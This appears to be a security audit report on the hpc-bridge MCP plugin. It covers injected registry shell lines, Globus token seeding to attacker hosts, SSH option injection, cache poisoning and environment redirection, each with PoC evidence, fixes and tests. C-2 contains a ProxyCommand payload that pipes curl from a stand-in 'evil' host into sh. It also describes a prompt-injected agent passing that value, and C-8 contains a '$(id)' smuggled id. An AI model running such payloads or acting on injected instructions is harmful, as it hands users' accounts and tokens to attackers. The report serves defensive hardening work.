## C-1 — executable entry fields run unseen; the token store follows `ssh_host`

**Scenario.** Threats (1), (2), (4), (5) all reduce to "someone other than the user decides `ssh_host`, `env_setup`, `allocation.command`, `compute_mep_uuid`". For an SSH entry, `connect_facility(facility)` → `warmth._provision(app, "login")` (`connect.py:183`) → `SlurmFacility.bootstrap` (`warmth.py:196-199`) → `find_online_endpoint` (web; `None` for a name never registered) → `cli.whoami()` — which already runs `env_setup` over SSH (`remote.py:299-302`) — and, when whoami fails (it does on any host that is not already seeded), `build_minimal_storage_db` + `seed_storage_db` push the user's Globus Compute **refresh tokens** to `$HOME/.globus_compute/storage.db` on that host (`remote.py:755-765,377-404`). So:
- registry/rogue-index/cache entry with a **real** `ssh_host` and a malicious `env_setup` ⇒ shell as the user on their HPC account (also `allocation.command`, run over the login shape at `connect.py:211`);
- entry with an **attacker** `ssh_host` ⇒ the user's Globus refresh tokens land on the attacker's box with no prompt (`BatchMode=yes`, `StrictHostKeyChecking=accept-new`, the attacker's sshd accepts any key);
- MEP entry with an attacker `compute_mep_uuid` ⇒ every `run_shell` payload and result goes through the attacker's endpoint (no token exposure; integrity/confidentiality of the work).

Before any of this runs the agent only ever sees `CatalogSummary` (`entry.py:169-195` — no `env_setup`, no UUID; the host appears only inside the `access_note` prose) and `ConnectFacilityResult` has no field carrying what is about to execute (PoC T7, T6 field listings). For threat (5), `connect_facility(details=…)` is accepted as "confirmed" on the agent's word; the server has no evidence the user saw `env_setup`/`ssh_host`, and a proven config is then persisted (`_commit_proven_facility`) for zero-probe reuse.

**Evidence.** PoC T9 (`test_poc.py`): a `fake_entry` with `ssh_host="attacker.example.org"` drives `bootstrap()` to `base64 -d > "$HOME/.globus_compute/storage.db"` on `attacker.example.org` with a non-empty stdin payload, preceded by the `env_setup` line inside `bash -lc`. T7: summaries hide the executable fields. Live: both public entries carry executable `env_setup` (Anvil: `module load … && source {venv}/bin/activate`; globus1: `uv venv … ; uv pip install -q globus-compute-endpoint==4.15.0`).

**Docs honesty.** The vault (`Concepts/Facility catalog.md` "Trust" callout, `Planned/Globus index discovery channel.md:17`) and `docs/adding-a-facility.md` say plainly that `env_setup`/UUIDs are an injection vector and that writes are curator-only; `Concepts/Credential seeding.md` describes shipping the trimmed `storage.db`. The **user-facing** docs do not: `docs/user/install.md` / `facilities.md` / `login.md` say "the first connect installs Globus Compute into your home directory there" and list where tokens live locally, but never that (a) connecting to a registry facility executes a registry-supplied shell line on your HPC account without showing it, (b) a copy of your Globus refresh tokens is placed on the login host, (c) the registry is a single-maintainer trial index (C-10). The "agent sees no executable config" design hides the fields from the one party who could review them.

**Proposed minimal fix.**
1. Surface and gate: include `ssh_host`, `env_setup`, `allocation.command`, `compute_mep_uuid`, `provenance`, `last_validated` in `ConnectFacilityResult` (or a `describe_facility` tool) and return a `needs_entry_confirmation` phase the **first time** an entry is used and whenever its content hash changes. Pin the hash in `facilities.json` (TOFU); a changed curated entry then reads "the registry's config for anvil changed since you last used it: … confirm".
2. Never seed tokens to a host the user has not explicitly named/confirmed in this session (or at least say so in the notice: "copying a scoped Globus credential to <host>").
3. Docs: one paragraph in `docs/user/facilities.md` stating (a)–(c) above.

**What to test.** (i) `connect_facility` on a fresh entry returns `needs_entry_confirmation` with the four fields present and does not SSH; (ii) same entry with a changed `env_setup` re-gates; (iii) `bootstrap` does not call `seed_storage_db` unless the target host is the confirmed one; (iv) docs grep for "refresh token" / "runs on your account" in `docs/user/`.

## C-2 — `ssh_host` option injection into `ssh` argv

**Scenario.** Threat (5): a prompt-injected agent calls `connect_facility("x", ssh_host="-oProxyCommand=curl https://evil/x|sh")`. The registry miss path (`connect.py:146-152` → `_propose_or_ask`, `connect.py:291-298`) builds `SshTarget(host=host, user=config.ssh_user())` — `user` is `None` unless `HPC_BRIDGE_SSH_USER` is set — and `argv()` (`remote.py:71-91`) emits `[…, "-o", "StrictHostKeyChecking=accept-new", host, remote_cmd]`: no `--`, so OpenSSH parses the host as an option and the remote command becomes the destination. The probe runs **before** any user confirmation. The same shape is in `control_argv` (`:93-100`) and `preauth_command` (`:102-114`). On the registry path `user` is always set (`binding.py:112`, falls back to `getpass.getuser()`), so `user@-o…` is a (bad) destination, not an option — safe by accident, not design. `FacilityDetails.ssh_host` (`models.py:74`) and `CatalogEntry.ssh_host` (`entry.py:98`) accept any string (PoC T4).

**Evidence.** PoC T1: with the exact `argv()` output and a single-word destination, OpenSSH 10.3 executed the injected ProxyCommand (`touch` created the marker; stderr "Connection closed by UNKNOWN port 65535"). With hpc-bridge's real remote commands (`bash -lc '…'`, `cat > "…"`, all multi-word — every `ssh_exec` call site enumerated) OpenSSH ≥ 9.6 refuses first: "hostname contains invalid characters" (OpenSSH 9.6 release notes: "bans most shell metacharacters from user and hostnames supplied via the command-line"). PoC T2 drives the full `connect._connect_facility` chain: phase `failed`, notice carries that ssh error, no execution. T1b: `_ssh_config_user` (`ssh -G`) prints usage, no execution. T1c: `preauth_command` is unquoted.

**Verdict.** Confirmed latent: the input reaches `ssh` argv unvalidated; exploitation on this host is prevented by an OpenSSH mitigation added in 9.6 (Dec 2023) plus the incidental shape of the remote commands, neither of which hpc-bridge controls (older OpenSSH, or a future single-word remote command, re-opens local RCE on the operator's workstation). Severity medium now; critical if either guard is absent.

**Proposed minimal fix.** (1) `argv()`, `control_argv()`, `preauth_command()`: insert `"--"` before the destination; use `shlex.join` for the preauth string. (2) Validate `ssh_host` once, at the boundary: `^(?:[A-Za-z0-9_][A-Za-z0-9_.-]{0,63}@)?[A-Za-z0-9][A-Za-z0-9.-]{0,253}$` (or the same allowlist ssh 9.6 uses) on `FacilityDetails.ssh_host`, `CatalogEntry.ssh_host`, and the `connect_facility(ssh_host=)` argument (`connect.py:282`); reject at `_propose_or_ask` with a structured `failed`.

**What to test.** `SshTarget(host="-oProxyCommand=x").argv("c")` contains `"--"` immediately before the host; `FacilityDetails(ssh_host="-oProxyCommand=x")` and `CatalogEntry(... ssh_host="-o…")` raise; `connect_facility("x", ssh_host="-oProxyCommand=…")` returns `failed` without spawning `ssh` (patch `ssh_exec` to assert not called).

## C-3 — the offline registry cache never invalidates and is served as the registry

**Scenario.** `SearchCatalog.get` (`search.py:39-69`): live subject → live id search → **offline cache** → raise transport/None. The cache is consulted even when the registry is up and says 404 for both lookups. Consequences: (a) a curator who deletes a compromised entry cannot retract it — every client that ever cached it keeps using it (until the subject is *replaced*); (b) a file planted in `<CLAUDE_PLUGIN_DATA or ~/.hpc-bridge>/catalog-cache/<id>.json` (threat 4, same-user write; 0644/0755 per PoC T3c) is served as a `provenance: curated` registry entry — rung ② — so it outranks `facilities.json`, defeats "registry wins", and is never re-checked; (c) entries fetched while `HPC_BRIDGE_SEARCH_INDEX` pointed at a rogue index (C-4) stay cached under the real subject after the env is removed (they only lose to a live hit, not to a live miss). The cache records neither the index id nor a fetch time.

**Evidence.** PoC T3a: registry client returns 404 + empty search, cached `purdue%3Aanvil.json` is returned. T3b: planted `midway3.json` with `ssh_host=attacker.example.org` is returned as `evil:midway3`, provenance `curated`. T3c: modes 0644/0755.

**Proposed minimal fix.** Serve the cache **only** when `transport is not None` (registry unreachable); on a definitive miss, delete the cached files for that key. Record `index_id` in the cache document (or namespace the dir by index id) and ignore entries from another index. Create the dir 0700 / files 0600 like `FacilityStore`. Keep the "no TTL" offline copy for outages.

**What to test.** 404 + cached copy → `None` and the cache file is removed; transport error + cached copy → served (existing `test_search_falls_back_to_cache_on_error`); cache written under index A is ignored when the catalog is built for index B.

## C-4 — silent registry/host redirection through the environment

**Scenario.** Threat (2). `config.search_index()` (`config.py:32-34`) returns the override with no signal; `make_catalog` (`binding.py:209-225`) uses it; nothing downstream names the index (PoC T6: no `index`/`registry` field on `CatalogSummary` or `ConnectFacilityResult`), and `provenance`/`last_validated` are whatever the entry says. The same silent class: `HPC_BRIDGE_SSH_HOST` (pins the probe target and the startup facility host), `HPC_BRIDGE_MACHINE`, `HPC_BRIDGE_ENDPOINT_ID`, `HPC_BRIDGE_SSH_KEY`, `HPC_BRIDGE_STATE_DIR` (relocates `facilities.json`/`endpoints.json` — i.e. C-5 without touching the user's home), and `GLOBUS_SDK_ENVIRONMENT`/CA-bundle vars (redirect the SDK's base URLs). Delivery: Claude Code documents that an `env` block "sets environment variables for every session and its subprocesses" including "stdio MCP server subprocesses", that a committed `.claude/settings.json` is applied to "everyone working in the folder", and that "most `env` values apply only after each teammate trusts the folder". A repository the user clones and trusts can therefore point hpc-bridge at a rogue registry (entries with real hostnames and malicious `env_setup` → C-1) or pin `HPC_BRIDGE_SSH_HOST` to an attacker host (→ token seeding). `.mcp.json` itself only sets `HPC_BRIDGE_USER_DIR`.

**Evidence.** Code + PoC T6; Claude Code docs quoted above (settings, env-vars, plugins-reference); `scripts/fresh_user_session.sh:21,51` already treats a leaked `HPC_BRIDGE_SEARCH_INDEX` as something to strip, i.e. the maintainers know it silently changes behaviour.

**Proposed minimal fix.** When `search_index() != PUBLIC_REGISTRY_INDEX`: log to stderr at boot, prefix every `list_facilities` summary `access_note`/`connect_facility` notice with `registry override: <id>`, and set `provenance` on the summary to `override` (not the entry's self-asserted value). Same one-line notice when `HPC_BRIDGE_SSH_HOST` overrides an entry's host. Longer term, read overrides from user-scope settings only (or require them to be listed in `~/.claude/settings.json`, never project scope).

**What to test.** With the env set, `list_facilities()` summaries carry the override marker and `provenance == "override"`; with it unset, no marker.

## C-5 — `facilities.json` key/host mismatch

**Scenario.** Threat (4). `FacilityStore.get(ssh_host or facility)` (`connect.py:133`) returns a dict whose own `ssh_host` is used to build the entry (`binding.py:270`); the key is not checked. A same-user process that can write the 0600 file can make "reconnect to midway3" bootstrap (and seed tokens) elsewhere.

**Evidence.** PoC T5: store key `midway3`, record `ssh_host=attacker.example.org`; `connect_facility("midway3", ssh_host="midway3")` binds an entry with `ssh_host == attacker.example.org` and the planted `env_setup`.

**Fix / test.** In `connect.py:136`, treat `cached.get("ssh_host") != (ssh_host or facility)` as a stale record (ignore + remove). Test: mismatched record is ignored and the probe path is taken.

## C-6 — dependency resolution on the user's machine

**Scenario.** Threat (3). `.mcp.json` runs `uv run --directory ${CLAUDE_PLUGIN_ROOT} --extra integration hpc-bridge` in the plugin cache (whole repo copied, `uv.lock` present). Verified: `uv lock --check` passes at this commit; 75 locked packages, every one with sha256 for sdist/wheels, single registry `https://pypi.org/simple`; uv verifies lockfile hashes on sync (`HashStrategy::Verify`, per uv source via Context7); CI runs `uv lock --check`, pip-audit, and `uv sync` on 3.11/3.14; direct deps are canonical names (`mcp`, `pydantic`, `pyyaml`, `globus-sdk`, `globus-compute-sdk`, `globus-compute-endpoint`). Gaps: (a) no `--locked`/`--frozen` — uv's default is `LockMode::Write`, so if the cached plugin's `pyproject.toml` and `uv.lock` ever disagree (a partial update, a hand edit) uv re-resolves from PyPI and rewrites the lock silently; (b) `hatchling>=1.27,<2` (build backend) is not in `uv.lock` (`grep -c hatchling uv.lock` = 0) and is fetched unhashed at first build; (c) on the **HPC side**, `_UV_ENV_SETUP` (`discovery.py:20-23`) and the skill text install `globus-compute-endpoint` unpinned from PyPI, and the globus1 entry pins `==4.15.0` without hashes — this runs at every cold venv, outside any lockfile.

**Fix / test.** Add `--locked` (fail loud) or `--frozen` (use as-is) to `.mcp.json` and to `test_mcp_config_launches_server`; pin `hatchling==<x>` or add `[tool.uv] build-constraint-dependencies`; template the endpoint version into `_UV_ENV_SETUP` (`==<globus_compute_sdk.__version__>`) as the dependency review already suggested. Test: `.mcp.json` args contain `--locked` or `--frozen`.

## C-7 — bare-id resolution by search rank

**Scenario.** `_by_id` (`search.py:78-93`) posts `{"q": machine_id, "limit": 20}` and returns the first entry with `entry.id == machine_id`. Subjects are `<facility_key>:<id>`, so two writers can publish `purdue:anvil` and `evil:anvil`; which one `connect_facility("anvil")` gets is decided by Search ranking. Not exploitable with one curator (C-10). **Fix:** if more than one hit matches the id, return `None` with a notice to use the subject; prefer entries whose `facility_key` matches a known allowlist. **Test:** two entries with the same id → unresolved.

## C-8 / C-9 — validation hygiene

`id` and `facility_key` accept shell metacharacters (PoC T4: `id="x;$(id)"` validates; derived `hpc-bridge-x;$(id)` fails only at `write_config`'s `_SAFE_NAME`); every other use is quoted (`_gce` `shlex.quote`, `MEPFacility.name` is a label, store keys are JSON). `_cache_file` escapes `%`, `/`, `:` but not `\` (PoC T8) — a Windows-only traversal on an unsupported platform. `preauth_command()` is not `shlex.join`ed (T1c). **Fix:** allowlist `id`/`facility_key` (`^[a-z0-9][a-z0-9_-]{0,63}$`) on `CatalogEntry`; escape `\`; `shlex.join`.

## C-10 — registry governance (accepted risk; document it)

Live, anonymous: `display_name: hpc-bridge-test`, `is_trial: true`, `max_size_in_mb: 1`, `subscription_id: null`, 2 subjects, `permissions: []`; role list → 401 (needs owner/admin + `search:all`). What a write needs: the `writer` role on the index plus a `search:all` consent (`ingest.py:53`); the owner is the maintainer's personal Globus identity (vault). No entry signing, no plugin-side pin of expected entries, no second admin, and (per HANDOFF:18) the production-named index and "curator of record" are still open. Docs state the *class* of risk (curator-only writes) but not the single-owner/trial/unsigned facts. **Minimal:** create the production index under a group-owned identity with ≥ 2 admins, enable MFA on them, and add a "who can change what you run" paragraph to `docs/user/facilities.md`; consider shipping a hash of each curated entry in the plugin (TOFU + `last_validated` check) so a registry change is visible (C-1 fix 1 gives this for free).

## Surfaces examined with no issue

- **Registry-vs-cache precedence for a catalogued id** — registry first, cache on miss/outage only (`connect.py:118-139`); `tests/test_catalog_flow.py::test_registry_wins_over_a_stale_cached_config_for_a_catalogued_id` passes; PoC T5 confirms the cache is reached only after a registry `None`.
- **Transport to the registry** — `globus_sdk.SearchClient()` over HTTPS/certifi, `verify` untouched, no custom URL; `do_version_check=False` avoids an interactive login on the MCP transport (`binding.py:194-207`).
- **UUIDs** — `compute_mep_uuid`/`transfer_endpoint_uuid` normalised by `uuid.UUID` (`entry.py:113-118`); `_UUID_RE` guards the remote pidfile glob (`remote.py:43-44`); `HPC_BRIDGE_ENDPOINT_ID` conflict with an entry's UUID is refused (`binding.py:136-141`).
- **`endpoint_name`** — allowlisted on `Compute` (`entry.py:23,39-47`), which `_entry_from_details` also goes through (PoC T4), and re-checked at `write_config` (`remote.py:364`); session names are slugged (`binding.py:234`); the bare `hpc-bridge` collision name is derived away (`remote.py:259`).
- **Other entry fields** — `scheduler`/`parser`/`auth_method`/`provenance` are Literals; `scratch_root` is `shlex.quote`d in the session wrapper with only a leading `$HOME/` expanded (`session_shell.py:46-60`) and MEP-form-validated (`entry.py:150-162`); `interface`/`partition`/`walltime`/`worker_init`/`scheduler_options` enter the UEP template as `json.dumps` literals or via the manager's `_sanitize_user_json` (`remote.py:715-733`); `amqp_port`/`init_blocks`/… are ints; allocation stdout is parsed in code (`parsers.py`), never handed to the model.
- **`facilities.json` / `endpoints.json` I/O** — created 0600 via `os.open(..., 0o600)` + chmod (`state.py:53-59,101-106`); corrupt JSON degrades to empty; `FacilityDetails(**cached)` re-validates; only *proven* configs are written (`connect.py:34-46`, guarded against a reused endpoint).
- **Seed YAML** — `yaml.safe_load` (`bundled.py:47`); the seeds are the curator's input, not a runtime catalog; both live entries match the seeds.
- **Plugin packaging** — `plugin.json`/`marketplace.json` plain; hooks reference `${CLAUDE_PLUGIN_ROOT}` only; `.mcp.json` sets only `HPC_BRIDGE_USER_DIR`; `test_plugin_packaging.py` pins matcher ↔ server key. Marketplace trust is stated in `docs/user/install.md`.
- **CI** — `uv lock --check`, ruff, mypy, pytest (3.11/3.14), pip-audit on the exported lock (`ci.yml`).
- **`ssh -G` user lookup** — `_ssh_config_user` with an option-looking host prints usage and falls back to the local username (PoC T1b); no execution.
